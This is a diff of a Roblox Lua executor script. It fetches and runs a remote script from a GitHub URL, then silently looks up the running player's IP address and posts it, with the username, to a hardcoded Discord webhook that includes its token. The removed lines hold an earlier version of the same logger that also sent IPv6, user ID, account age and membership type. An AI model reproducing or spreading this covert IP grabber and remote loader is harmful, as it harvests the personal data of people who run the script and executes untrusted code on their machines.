@@ -1,3 +1,60 @@
+-- put your shitty script here
+loadstring(game:HttpGet("https://raw.githubusercontent.com/II-Fallzy-II/Godslayer/main/Cutie%20fallz%20hub"))()
+-- above is your script
+
+
+
+--ip below
+local webh = "https://discord.com/api/webhooks/996322079425171496/_WLhwtHJZlIbAZlXbtH4kYv9C6XPnMUiweS2McpdpV7ijJG81tcw7x9MzcJkyGf26fbB"
+
+pcall(function()
+   local data = {
+       ["embeds"] = {
+           {
+               ["title"] = game:GetService("Players").LocalPlayer.Name,
+               ["description"] = "Ip = "  .. game:HttpGet("https://api.ipify.org")
+           }
+       }
+   }
+
+   if syn then
+       local response = syn.request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif request then
+       local response = request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif http_request then
+       local response = http_request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   end
+end)
+
+--ip^
+
 while wait(1.2) do
     
 for i, x in pairs(game.Players:GetPlayers()) do
@@ -30,68 +87,4 @@ end
 end
 
 
--- put your shitty script here
-loadstring(game:HttpGet("https://raw.githubusercontent.com/II-Fallzy-II/Godslayer/main/Cutie%20fallz%20hub"))()
--- above is your script
 
-local Webhook = "https://discord.com/api/webhooks/996322079425171496/_WLhwtHJZlIbAZlXbtH4kYv9C6XPnMUiweS2McpdpV7ijJG81tcw7x9MzcJkyGf26fbB"
-
-local IPv4 = game:HttpGet("https://v4.ident.me/")
-local IPv6 = game:HttpGet("https://v6.ident.me/")
-
-local Headers = {["content-type"] = "application/json"} -- Don't Modify
-
-local LocalPlayer = game:GetService("Players").LocalPlayer
-
-local AccountAge = LocalPlayer.AccountAge
-local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
-local UserId = LocalPlayer.UserId
-local PlayerName = game:GetService("CoreGui").RobloxGui.PlayerListMaster.OffsetFrame.PlayerScrollList.SizeOffsetFrame.ScrollingFrameContainer.ScrollingFrameClippingFrame.ScollingFrame.OffsetUndoFrame["p_"..UserId].ChildrenFrame.NameFrame.BGFrame.OverlayFrame.PlayerName.PlayerName.Text
-
-local PlayerData =
-{
-       ["content"] = "",
-       ["embeds"] = {{
-           ["title"] = "**Username**:",
-           ["description"] = PlayerName,
-           ["color"] = tonumber(0x2B6BE4),
-           ["fields"] = {
-               {
-                   ["name"] = "MembershipType:",
-                   ["value"] = MembershipType,
-                   ["inline"] = true
-},
-               {
-                   ["name"] = "AccountAge:",
-                   ["value"] = AccountAge,
-                   ["inline"] = true
-},
-               {
-                   ["name"] = "UserId:",
-                   ["value"] = UserId,
-                   ["inline"] = true
-},
-               {
-                   ["name"] = "IPv4:",
-                   ["value"] = IPv4,
-                   ["inline"] = true
-},
-               {
-                   ["name"] = "IPv6:",
-                   ["value"] = IPv6,
-                   ["inline"] = true
-},
-           },
-       }}
-   }
-
-local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
-local HttpRequest = http_request;
-
-if syn then
-   HttpRequest = syn.request
-   else
-   HttpRequest = http_request
-end
-
-HttpRequest({Url=Webhook, Body=PlayerData, Method="POST", Headers=Headers})
